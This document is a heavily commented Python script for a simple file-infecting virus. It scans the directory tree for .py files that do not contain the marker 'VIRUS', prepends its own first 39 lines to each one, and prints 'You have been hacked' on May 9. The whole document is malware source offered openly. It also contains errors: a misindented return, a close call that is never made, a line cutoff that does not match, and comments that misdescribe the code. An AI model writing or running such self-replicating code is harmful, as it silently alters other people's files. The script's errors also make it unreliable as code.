#!/usr/bin/python3


# This function imports library and date time Module
import os    # Imports OS Library
import datetime  # Imports content from the datetime module

# The string which contains a signature known as Virus
SIGNATURE = "VIRUS"    # Variable stores string Virus which allows it to search for infected content

# This allows the script to search for files, selecting those that aren't infected and returning them and keeping the ones that are
def locate(path):     # This searches for python files in the path, creates a list that doesn't have virus signature
    files_targeted = []   # This function infects targeted files by appending the initial lines of this script to the beginning of each file
    filelist = os.listdir(path)  # This part takes takes the filelist in the OS directory and produces it
    for fname in filelist:        # This is a For loop which works with the filelist 
        if os.path.isdir(path+"/"+fname): # An if loop checking if the file is in a directory
            files_targeted.extend(locate(path+"/"+fname))  # Extends targeted files
        elif fname[-3:] == ".py":  # Checks if it's a python file
            infected = False  # Variable of infected is set to False
            for line in open(path+"/"+fname):  # For loop that iterates through line of file
                if SIGNATURE in line: # If the variable signature is found in the line of file
                    infected = True  # Sets variable to true
                    break  # Exits Loop
            if infected == False:  # If the variable signature is false in the line of file 
                files_targeted.append(path+"/"+fname)  # Adds file to list of files targeted
     return files_targeted  # Returns list of files_targeted

# This function begins the infection process 
def infect(files_targeted):  # Defines function infect
    virus = open(os.path.abspath(__file__))  # Opens file
    virusstring = ""  # Places Virus String variable as empty
    for i,line in enumerate(virus): # For loop which reads lines of file 
        if 0 <= i < 39: # If line is between o and 39
            virusstring += line  # Adds line to virus string 
    virus.close # Closes file
    for fname in files_targeted: # For loop that goes through file
        f = open(fname) # Opens the file
        temp = f.read() # Reads content of File
        f.close() # Closes the file
        f = open(fname,"w") # Opens the file to write in
        f.write(virusstring + temp) # Writes Virus String and contents into file
        f.close() # Close file
# This portion checks the date and if it May 9th then it proceeds to print "You have been hacked" when the trigger occurs
def detonate(): # Defines the function detonate 
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: # If the date is May 9th
        print("You have been hacked") # Prints to screen You have been hacked

# The final three lines call the function and execute it. This activates the virus and completes the script.
files_targeted = locate(os.path.abspath("")) # Executes virus, indetifying files and storing those that haven't been infected yet
infect(files_targeted) # Calls the function infect
detonate() # Detonate function starts
